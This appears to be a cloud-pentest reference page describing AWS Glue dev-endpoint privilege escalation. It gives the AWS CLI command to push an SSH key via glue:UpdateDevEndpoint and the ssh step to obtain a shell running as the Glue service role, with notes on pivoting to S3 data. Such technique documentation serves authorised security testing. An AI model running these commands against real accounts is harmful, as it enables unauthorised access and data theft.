---
title: "UpdateDevEndpoint: push an SSH key to a Glue dev endpoint"
description: "glue:UpdateDevEndpoint to push an SSH public key to a Glue development endpoint running a privileged role and get a shell."
keywords:
  - UpdateDevEndpoint
  - Glue
  - dev endpoint
  - SSH key
  - service role
---

# UpdateDevEndpoint

A Glue development endpoint is a long-lived instance that runs with a Glue **service role**. `glue:UpdateDevEndpoint` lets you add an SSH public key to an existing endpoint, then you SSH in and operate as the role, no `PassRole` required.

## Add your key and connect

```bash
aws glue update-dev-endpoint --endpoint-name <endpoint> \
  --add-public-keys "$(cat ~/.ssh/id_ed25519.pub)"
# then SSH to the endpoint's public address as the glue user
ssh glue@<endpoint-address>
#   aws sts get-caller-identity   (runs as the Glue role)
```

## Exploitation notes

- The endpoint must already exist; this is the update variant of the [Glue PassRole](../pass-role/glue.md) creation path.
- Glue service roles frequently carry broad S3 and Data Catalog access, so the shell is a strong data-access and pivot position.

## Tools

- **AWS CLI** (`glue update-dev-endpoint`).
- **Pacu**: Glue modules.

## References

- [Rhino Security Labs: AWS privilege escalation (Glue dev endpoint)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [HackTricks Cloud: AWS Glue](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-glue-enum.html)
